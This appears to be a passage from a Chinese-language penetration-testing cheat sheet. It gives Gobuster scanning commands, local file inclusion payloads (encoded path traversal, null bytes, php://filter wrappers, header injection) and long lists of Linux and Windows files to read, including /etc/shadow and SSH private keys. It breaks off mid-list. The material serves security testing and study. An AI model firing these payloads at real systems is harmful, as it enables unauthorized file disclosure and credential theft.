<h4 id="Gobuster-扫描工具"><a href="#Gobuster-扫描工具" class="headerlink" title="Gobuster 扫描工具"></a>Gobuster 扫描工具</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">-e    <span class="hljs-comment">// 呈现完整url的扩展模式</span><br>-k    <span class="hljs-comment">// 跳过ssl证书验证</span><br>-r    <span class="hljs-comment">// 遵循cedirects</span><br>-s    <span class="hljs-comment">// 状态代码</span><br>-b    <span class="hljs-comment">// 排除状态代码</span><br>-k            <span class="hljs-comment">// 忽略证书</span><br>--wildcard    <span class="hljs-comment">// 设置通配符选项</span><br><br>$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-<span class="hljs-built_in">list</span><span class="hljs-number">-2.3</span>-medium.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/</span><br><br>$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/ -x php</span><br><br>$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/ -x php,txt,html,js -e -s 200</span><br><br>$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-<span class="hljs-built_in">list</span>-lowercase<span class="hljs-number">-2.3</span>-medium.txt -u https:<span class="hljs-comment">//&lt;RHOST&gt;:&lt;RPORT&gt;/ -b 200 -k --wildcard</span><br></code></pre></td></tr></table></figure>

<h5 id="常见文件扩展名"><a href="#常见文件扩展名" class="headerlink" title="常见文件扩展名"></a>常见文件扩展名</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">txt,bak,php,html,js,asp,aspx<br></code></pre></td></tr></table></figure>

<h5 id="常见图片扩展"><a href="#常见图片扩展" class="headerlink" title="常见图片扩展"></a>常见图片扩展</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">png,jpg,jpeg,gif,bmp<br></code></pre></td></tr></table></figure>

<h5 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-<span class="hljs-built_in">list</span>-lowercase<span class="hljs-number">-2.3</span>-medium.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/api/ -e -s 200</span><br></code></pre></td></tr></table></figure>

<h5 id="DNS扫描"><a href="#DNS扫描" class="headerlink" title="DNS扫描"></a>DNS扫描</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">gobuster dns -d &lt;RHOST&gt; -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million<span class="hljs-number">-5000.</span>txt<br><br>gobuster dns -d &lt;RHOST&gt; -t <span class="hljs-number">50</span> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million<span class="hljs-number">-110000.</span>txt<br></code></pre></td></tr></table></figure>

<h5 id="虚拟主机子域名发现扫描"><a href="#虚拟主机子域名发现扫描" class="headerlink" title="虚拟主机子域名发现扫描"></a>虚拟主机子域名发现扫描</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">gobuster vhost -u &lt;RHOST&gt; -t <span class="hljs-number">50</span> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million<span class="hljs-number">-110000.</span>txt<br><br>gobuster vhost -u &lt;RHOST&gt; -t <span class="hljs-number">50</span> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million<span class="hljs-number">-110000.</span>txt --append-domain<br></code></pre></td></tr></table></figure>

<h5 id="指定用户代理"><a href="#指定用户代理" class="headerlink" title="指定用户代理"></a>指定用户代理</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gobuster dir -w /usr/share/wordlists/dirbuster/directory-<span class="hljs-built_in">list</span><span class="hljs-number">-2.3</span>-medium.txt -u http:<span class="hljs-comment">//&lt;RHOST&gt;/ -a Linux</span><br></code></pre></td></tr></table></figure>

<h4 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含 (LFI)"></a>本地文件包含 (LFI)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//&lt;RHOST&gt;/&lt;FILE&gt;.php?file=</span><br>http:<span class="hljs-comment">//&lt;RHOST&gt;/&lt;FILE&gt;.php?file=../../../../../../../../etc/passwd</span><br>http:<span class="hljs-comment">//&lt;RHOST&gt;/&lt;FILE&gt;/php?file=../../../../../../../../../../etc/passwd</span><br></code></pre></td></tr></table></figure>

<h5 id="截止到PHP-5-3-版本的漏洞"><a href="#截止到PHP-5-3-版本的漏洞" class="headerlink" title="截止到PHP 5.3 版本的漏洞"></a>截止到PHP 5.3 版本的漏洞</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//&lt;RHOST&gt;/&lt;FILE&gt;/php?file=../../../../../../../../../../etc/passwd%00</span><br></code></pre></td></tr></table></figure>

<h5 id="空字节"><a href="#空字节" class="headerlink" title="空字节"></a>空字节</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">%<span class="hljs-number">00</span><br><span class="hljs-number">0x00</span><br></code></pre></td></tr></table></figure>

<h5 id="编码遍历字符串"><a href="#编码遍历字符串" class="headerlink" title="编码遍历字符串"></a>编码遍历字符串</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">../<br>..\<br>..\/<br>%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e%<span class="hljs-number">2f</span><br>%<span class="hljs-number">252</span>e%<span class="hljs-number">252</span>e%<span class="hljs-number">252f</span><br>%c0%ae%c0%ae%c0%af<br>%uff0e%uff0e%u2215<br>%uff0e%uff0e%u2216<br>..././<br>...\.\<br></code></pre></td></tr></table></figure>

<h5 id="PHP-过滤器包装器"><a href="#PHP-过滤器包装器" class="headerlink" title="PHP:&#x2F;&#x2F;过滤器包装器"></a>PHP:&#x2F;&#x2F;过滤器包装器</h5><p>参考文章： <a target="_blank" rel="noopener" href="https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb">https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb</a><br>参考文章地址： <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</a><br>参考文章地址： <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">url=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=file:////var/www/&lt;RHOST&gt;/api.php</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//&lt;RHOST&gt;/index.php?page=php://filter/convert.base64-encode/resource=index</span><br>http:<span class="hljs-comment">//&lt;RHOST&gt;/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd</span><br>base64 -d &lt;FILE&gt;.php<br></code></pre></td></tr></table></figure>

<h5 id="Django、Rails-或-Node-js-Web-应用程序标头值"><a href="#Django、Rails-或-Node-js-Web-应用程序标头值" class="headerlink" title="Django、Rails 或 Node.js Web 应用程序标头值"></a>Django、Rails 或 Node.js Web 应用程序标头值</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Accept: ../../../../.././../../../../etc/passwd&#123;&#123;<br>Accept: ../../../../.././../../../../etc/passwd&#123;%<span class="hljs-number">0</span>D<br>Accept: ../../../../.././../../../../etc/passwd&#123;%<span class="hljs-number">0</span>A<br>Accept: ../../../../.././../../../../etc/passwd&#123;%<span class="hljs-number">00</span><br>Accept: ../../../../.././../../../../etc/passwd&#123;%<span class="hljs-number">0</span>D&#123;&#123;<br>Accept: ../../../../.././../../../../etc/passwd&#123;%<span class="hljs-number">0</span>A&#123;&#123;<br>Accept: ../../../../.././../../../../etc/passwd&#123;%<span class="hljs-number">00</span>&#123;&#123;<br></code></pre></td></tr></table></figure>

<h5 id="Linux文件"><a href="#Linux文件" class="headerlink" title="Linux文件"></a>Linux文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br></pre></td><td class="code"><pre><code class="hljs c">/etc/passwd<br>/etc/shadow<br>/etc/aliases<br>/etc/anacrontab<br>/etc/apache2/apache2.conf<br>/etc/apache2/httpd.conf<br>/etc/apache2/sites-enabled/<span class="hljs-number">000</span>-<span class="hljs-keyword">default</span>.conf<br>/etc/at.allow<br>/etc/at.deny<br>/etc/bashrc<br>/etc/bootptab<br>/etc/chrootUsers<br>/etc/chttp.conf<br>/etc/cron.allow<br>/etc/cron.deny<br>/etc/crontab<br>/etc/cups/cupsd.conf<br>/etc/exports<br>/etc/fstab<br>/etc/ftpaccess<br>/etc/ftpchroot<br>/etc/ftphosts<br>/etc/groups<br>/etc/grub.conf<br>/etc/hosts<br>/etc/hosts.allow<br>/etc/hosts.deny<br>/etc/httpd/access.conf<br>/etc/httpd/conf/httpd.conf<br>/etc/httpd/httpd.conf<br>/etc/httpd/logs/access_log<br>/etc/httpd/logs/access.<span class="hljs-built_in">log</span><br>/etc/httpd/logs/error_log<br>/etc/httpd/logs/error.<span class="hljs-built_in">log</span><br>/etc/httpd/php.ini<br>/etc/httpd/srm.conf<br>/etc/inetd.conf<br>/etc/inittab<br>/etc/issue<br>/etc/knockd.conf<br>/etc/lighttpd.conf<br>/etc/lilo.conf<br>/etc/logrotate.d/ftp<br>/etc/logrotate.d/proftpd<br>/etc/logrotate.d/vsftpd.<span class="hljs-built_in">log</span><br>/etc/lsb-release<br>/etc/motd<br>/etc/modules.conf<br>/etc/motd<br>/etc/mtab<br>/etc/my.cnf<br>/etc/my.conf<br>/etc/mysql/my.cnf<br>/etc/network/interfaces<br>/etc/networks<br>/etc/npasswd<br>/etc/passwd<br>/etc/php4<span class="hljs-number">.4</span>/fcgi/php.ini<br>/etc/php4/apache2/php.ini<br>/etc/php4/apache/php.ini<br>/etc/php4/cgi/php.ini<br>/etc/php4/apache2/php.ini<br>/etc/php5/apache2/php.ini<br>/etc/php5/apache/php.ini<br>/etc/php/apache2/php.ini<br>/etc/php/apache/php.ini<br>/etc/php/cgi/php.ini<br>/etc/php.ini<br>/etc/php/php4/php.ini<br>/etc/php/php.ini<br>/etc/printcap<br>/etc/profile<br>/etc/proftp.conf<br>/etc/proftpd/proftpd.conf<br>/etc/pure-ftpd.conf<br>/etc/pureftpd.passwd<br>/etc/pureftpd.pdb<br>/etc/pure-ftpd/pure-ftpd.conf<br>/etc/pure-ftpd/pure-ftpd.pdb<br>/etc/pure-ftpd/putreftpd.pdb<br>/etc/redhat-release<br>/etc/resolv.conf<br>/etc/samba/smb.conf<br>/etc/snmpd.conf<br>/etc/ssh/ssh_config<br>/etc/ssh/sshd_config<br>/etc/ssh/ssh_host_dsa_key<br>/etc/ssh/ssh_host_dsa_key.pub<br>/etc/ssh/ssh_host_key<br>/etc/ssh/ssh_host_key.pub<br>/etc/sysconfig/network<br>/etc/syslog.conf<br>/etc/termcap<br>/etc/vhcs2/proftpd/proftpd.conf<br>/etc/vsftpd.chroot_list<br>/etc/vsftpd.conf<br>/etc/vsftpd/vsftpd.conf<br>/etc/wu-ftpd/ftpaccess<br>/etc/wu-ftpd/ftphosts<br>/etc/wu-ftpd/ftpusers<br>/logs/pure-ftpd.<span class="hljs-built_in">log</span><br>/logs/security_debug_log<br>/logs/security_log<br>/opt/lampp/etc/httpd.conf<br>/opt/xampp/etc/php.ini<br>/proc/cmdline<br>/proc/cpuinfo<br>/proc/filesystems<br>/proc/interrupts<br>/proc/ioports<br>/proc/meminfo<br>/proc/modules<br>/proc/mounts<br>/proc/net/arp<br>/proc/net/tcp<br>/proc/net/udp<br>/proc/&lt;PID&gt;/cmdline<br>/proc/&lt;PID&gt;/maps<br>/proc/sched_debug<br>/proc/self/cwd/app.py<br>/proc/self/environ<br>/proc/self/net/arp<br>/proc/stat<br>/proc/swaps<br>/proc/version<br>/root/anaconda-ks.cfg<br>/usr/etc/pure-ftpd.conf<br>/usr/lib/php.ini<br>/usr/lib/php/php.ini<br>/usr/local/apache/conf/modsec.conf<br>/usr/local/apache/conf/php.ini<br>/usr/local/apache/<span class="hljs-built_in">log</span><br>/usr/local/apache/logs<br>/usr/local/apache/logs/access_log<br>/usr/local/apache/logs/access.<span class="hljs-built_in">log</span><br>/usr/local/apache/audit_log<br>/usr/local/apache/error_log<br>/usr/local/apache/error.<span class="hljs-built_in">log</span><br>/usr/local/cpanel/logs<br>/usr/local/cpanel/logs/access_log<br>/usr/local/cpanel/logs/error_log<br>/usr/local/cpanel/logs/license_log<br>/usr/local/cpanel/logs/login_log<br>/usr/local/cpanel/logs/stats_log<br>/usr/local/etc/httpd/logs/access_log<br>/usr/local/etc/httpd/logs/error_log<br>/usr/local/etc/php.ini<br>/usr/local/etc/pure-ftpd.conf<br>/usr/local/etc/pureftpd.pdb<br>/usr/local/lib/php.ini<br>/usr/local/php4/httpd.conf<br>/usr/local/php4/httpd.conf.php<br>/usr/local/php4/lib/php.ini<br>/usr/local/php5/httpd.conf<br>/usr/local/php5/httpd.conf.php<br>/usr/local/php5/lib/php.ini<br>/usr/local/php/httpd.conf<br>/usr/local/php/httpd.conf.ini<br>/usr/local/php/lib/php.ini<br>/usr/local/pureftpd/etc/pure-ftpd.conf<br>/usr/local/pureftpd/etc/pureftpd.pdn<br>/usr/local/pureftpd/sbin/pure-config.pl<br>/usr/local/www/logs/httpd_log<br>/usr/local/Zend/etc/php.ini<br>/usr/sbin/pure-config.pl<br>/var/adm/<span class="hljs-built_in">log</span>/xferlog<br>/var/apache2/config.inc<br>/var/apache/logs/access_log<br>/var/apache/logs/error_log<br>/var/cpanel/cpanel.config<br>/var/lib/mysql/my.cnf<br>/var/lib/mysql/mysql/user.MYD<br>/var/local/www/conf/php.ini<br>/var/<span class="hljs-built_in">log</span>/apache2/access_log<br>/var/<span class="hljs-built_in">log</span>/apache2/access.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/apache2/error_log<br>/var/<span class="hljs-built_in">log</span>/apache2/error.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/apache/access_log<br>/var/<span class="hljs-built_in">log</span>/apache/access.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/apache/error_log<br>/var/<span class="hljs-built_in">log</span>/apache/error.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/apache-ssl/access.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/apache-ssl/error.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/auth.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/boot<br>/var/htmp<br>/var/<span class="hljs-built_in">log</span>/chttp.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/cups/error.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/daemon.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/debug<br>/var/<span class="hljs-built_in">log</span>/dmesg<br>/var/<span class="hljs-built_in">log</span>/dpkg.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/exim_mainlog<br>/var/<span class="hljs-built_in">log</span>/exim/mainlog<br>/var/<span class="hljs-built_in">log</span>/exim_paniclog<br>/var/<span class="hljs-built_in">log</span>/exim.paniclog<br>/var/<span class="hljs-built_in">log</span>/exim_rejectlog<br>/var/<span class="hljs-built_in">log</span>/exim/rejectlog<br>/var/<span class="hljs-built_in">log</span>/faillog<br>/var/<span class="hljs-built_in">log</span>/ftplog<br>/var/<span class="hljs-built_in">log</span>/ftp-proxy<br>/var/<span class="hljs-built_in">log</span>/ftp-proxy/ftp-proxy.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/httpd-access.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/httpd/access_log<br>/var/<span class="hljs-built_in">log</span>/httpd/access.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/httpd/error_log<br>/var/<span class="hljs-built_in">log</span>/httpd/error.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/httpsd/ssl.access_log<br>/var/<span class="hljs-built_in">log</span>/httpsd/ssl_log<br>/var/<span class="hljs-built_in">log</span>/kern.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/lastlog<br>/var/<span class="hljs-built_in">log</span>/lighttpd/access.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/lighttpd/error.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/lighttpd/lighttpd.access.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/lighttpd/lighttpd.error.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/mail.info<br>/var/<span class="hljs-built_in">log</span>/mail.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/maillog<br>/var/<span class="hljs-built_in">log</span>/mail.warn<br>/var/<span class="hljs-built_in">log</span>/message<br>/var/<span class="hljs-built_in">log</span>/messages<br>/var/<span class="hljs-built_in">log</span>/mysqlderror.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/mysql.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/mysql/mysql-bin.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/mysql/mysql.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/mysql/mysql-slow.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/proftpd<br>/var/<span class="hljs-built_in">log</span>/pureftpd.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/pure-ftpd/pure-ftpd.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/secure<br>/var/<span class="hljs-built_in">log</span>/vsftpd.<span class="hljs-built_in">log</span><br>/var/<span class="hljs-built_in">log</span>/wtmp<br>/var/<span class="hljs-built_in">log</span>/xferlog<br>/var/<span class="hljs-built_in">log</span>/yum.<span class="hljs-built_in">log</span><br>/var/mysql.<span class="hljs-built_in">log</span><br>/var/run/utmp<br>/var/spool/cron/crontabs/root<br>/var/webmin/miniserv.<span class="hljs-built_in">log</span><br>/var/www/html&lt;VHOST&gt;/__init__.py<br>/var/www/html/db_connect.php<br>/var/www/html/utils.php<br>/var/www/<span class="hljs-built_in">log</span>/access_log<br>/var/www/<span class="hljs-built_in">log</span>/error_log<br>/var/www/logs/access_log<br>/var/www/logs/error_log<br>/var/www/logs/access.<span class="hljs-built_in">log</span><br>/var/www/logs/error.<span class="hljs-built_in">log</span><br>~/.atfp_history<br>~/.bash_history<br>~/.bash_logout<br>~/.bash_profile<br>~/.bashrc<br>~/.gtkrc<br>~/.login<br>~/.logout<br>~/.mysql_history<br>~/.nano_history<br>~/.php_history<br>~/.profile<br>~/.ssh/authorized_keys<br>~/.ssh/id_dsa<br>~/.ssh/id_dsa.pub<br>~/.ssh/id_rsa<br>~/.ssh/id_rsa.pub<br>~/.ssh/identity<br>~/.ssh/identity.pub<br>~/.viminfo<br>~/.wm_style<br>~/.Xdefaults<br>~/.xinitrc<br>~/.Xresources<br>~/.xsession<br></code></pre></td></tr></table></figure>

<h5 id="Windows文件"><a href="#Windows文件" class="headerlink" title="Windows文件"></a>Windows文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c">C:/Users/Administrator/NTUser.dat<br>C:/Documents and Settings/Administrator/NTUser.dat<br>C:/apache/logs/access.<span class="hljs-built_in">log</span><br>C:/apache/logs/error.<span class="hljs-built_in">log</span><br>C:/apache/php/php.ini<br>C:/boot.ini<br>C:/inetpub/wwwroot/global.asa<br>C:/MySQL/data/hostname.err<br>C:/MySQL/data/mysql.err<br>C:/MySQL/data/mysql.<span class="hljs-built_in">log</span><br>C:/MySQL/my.cnf<br>C:/MySQL/my.ini<br>C:/php4/php.ini<br>C:/php5/php.ini<br>C:/php/php.ini<br>C:/Program Files/Apache Group/Apache2/conf/httpd.conf<br>C:/Program Files/Apache Group/Apache/conf/httpd.conf<br>C:/Program Files/Apache Group/Apache/logs/access.<span class="hljs-built_in">log</span><br>C:/Program Files/Apache Group/Apache/logs/error.<span 